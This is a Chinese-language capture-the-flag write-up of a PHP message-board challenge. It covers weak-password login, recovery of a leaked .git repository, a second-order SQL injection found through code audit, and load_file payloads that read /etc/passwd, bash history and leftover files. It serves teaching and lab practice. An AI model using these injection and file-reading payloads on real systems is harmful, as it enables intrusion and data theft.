![[Pasted image 20230119140827.png|500]]

![[Pasted image 20230119140851.png|1000]]

尝试发帖时被要求登陆

![[Pasted image 20230119141013.png|500]]

一时竟没想到是猜密码

```
username: zhangwei
password: zhangwei666
```

![[Pasted image 20230119141928.png|1000]]

```
/comment.php?id=1
```

![[Pasted image 20230119142123.png|500]]

# 获取源码

扫描目录

![[Pasted image 20230119142301.png|1000]]

存在`git`泄露

![[Pasted image 20230119142408.png|1000]]

![[Pasted image 20230119142530.png|500]]

被骗了.jpg

然后发现一个功能更强大一点的`githacker`

```shell
githacker --url http://99171b24-38c9-4bf6-ae83-d4cecaa108ef.node4.buuoj.cn:81/.git/ --output-folder result --delay 0.1 --threads 1
```

```shell
git log --reflog
```

![[Pasted image 20230119144942.png|700]]

可以看出进行过版本回退

```shell
git reset --hard e5b2a
```

```php
<?php
include "mysql.php";
session_start();
if($_SESSION['login'] != 'yes'){
    header("Location: ./login.php");
    die();
}
if(isset($_GET['do'])){
switch ($_GET['do'])
{
case 'write':
    $category = addslashes($_POST['category']);
    $title = addslashes($_POST['title']);
    $content = addslashes($_POST['content']);
    $sql = "insert into board
            set category = '$category',
                title = '$title',
                content = '$content'";
    $result = mysql_query($sql);
    header("Location: ./index.php");
    break;
case 'comment':
    $bo_id = addslashes($_POST['bo_id']);
    $sql = "select category from board where id='$bo_id'";
    $result = mysql_query($sql);
    $num = mysql_num_rows($result);
    if($num>0){
	    $category = mysql_fetch_array($result)['category'];
	    $content = addslashes($_POST['content']);
	    $sql = "insert into comment
	            set category = '$category',
	                content = '$content',
	                bo_id = '$bo_id'";
	    $result = mysql_query($sql);
    }
    header("Location: ./comment.php?id=$bo_id");
    break;
default:
    header("Location: ./index.php");
}
}
else{
    header("Location: ./index.php");
}
?>
```

在`write`操作中，所有的`POST`参数都经过了`addslashes`的转义，而在`comment`操作中，`category`却没有进行`addslashes`转义，这就给二次注入创造了机会

# 文件读取

综合利用单行和多行注释使查询合法
```
title=ttt&content=ccc&category=',content=load_file('/etc/passwd')/*
```

这时发表评论内容

```
content=*/,#
```

注入的结果是这样

```sql
insert into comment
set category = '',content=load_file('/etc/passwd')/*',
    content = '*/,#',
    bo_id = '$bo_id'
```

![[Pasted image 20230119153110.png|700]]

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
mysql:x:102:105:MySQL Server,,,:/var/lib/mysql:/bin/false
www:x:500:500:www:/home/www:/bin/bash
```

不寻常的一点是，用户`www`就像普通用户一样拥有`/home`下的家目录

而且通常非登录用户的登录`shell`都设为`nologin`以防止其登录，而`www`的登录`shell`却被设置为`bash`，此事必有蹊跷

![[Pasted image 20230119154202.png|700]]

读取`/home/www/.bash_history`

```shell
cd /tmp/
unzip html.zip
rm -f html.zip
cp -r html /var/www/
cd /var/www/html/
rm -f .DS_Store
service apache2 start
```

1. 在`/tmp`下解压了`html.zip`
2. 删除压缩包
3. 将解压出来的`html`文件夹递归复制到`/var/www`下
4. 删除`/var/www/html/.DS_Store`
5. 启动服务器

删了，但没完全删掉.jpg

读取`/tmp/html/.DS_Store`

对于二进制文件，采用十六进制编码输出

```sql
hex(load_file('/tmp/html/.DS_Store'))
```

```python
s = 'xxxxxx'

f = open('.DS_Store','w')

for i in range(len(s) // 2):
    ss = s[2 * i: 2 * i + 2]
    f.write(chr(int(ss, base=16)))
```

![[Pasted image 20230119164005.png|1000]]

读取`/tmp/html/flag_8946e1ff1ee3e40f.php`

![[Pasted image 20230119164349.png|1000]]

然后发现这个`flag`是假的QAQ

真正的`flag`在`/var/www/html/`下

![[Pasted image 20230119164540.png|1000]]

#Web #PHP #代码审计 #git泄露 #DS_Store泄露 #二次注入